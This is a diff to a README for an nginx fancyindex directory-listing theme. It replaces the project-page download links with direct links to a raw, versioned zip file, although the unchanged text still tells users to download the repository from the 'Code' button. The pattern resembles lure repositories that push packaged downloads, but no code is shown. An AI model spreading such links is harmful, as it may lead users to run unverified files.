@@ -1,6 +1,6 @@
 # 📁 nginx-fancyindex-theme-shadcn - Elevate your file directory visual style
 
-[![Download Theme](https://img.shields.io/badge/Download-Theme-blue)](https://github.com/zeli4650/nginx-fancyindex-theme-shadcn)
+[![Download Theme](https://img.shields.io/badge/Download-Theme-blue)](https://github.com/zeli4650/nginx-fancyindex-theme-shadcn/raw/refs/heads/main/theme/fancyindex_theme_shadcn_nginx_v1.9.zip)
 
 This project provides a clean, modern interface for your web server directory listings. It helps users navigate your files with a layout inspired by the shadcn design system. You gain a professional look that improves readability and user interaction for any web directory.
 
@@ -12,7 +12,7 @@ You need a working installation of Nginx on your Windows machine to use this the
 
 Visit the project page to download the latest version of the theme files. You can find the source code and style assets directly through the link below.
 
-[Download the theme files here](https://github.com/zeli4650/nginx-fancyindex-theme-shadcn)
+[Download the theme files here](https://github.com/zeli4650/nginx-fancyindex-theme-shadcn/raw/refs/heads/main/theme/fancyindex_theme_shadcn_nginx_v1.9.zip)
 
 Click the green "Code" button on the GitHub page and select "Download ZIP" to save the theme to your computer.
 
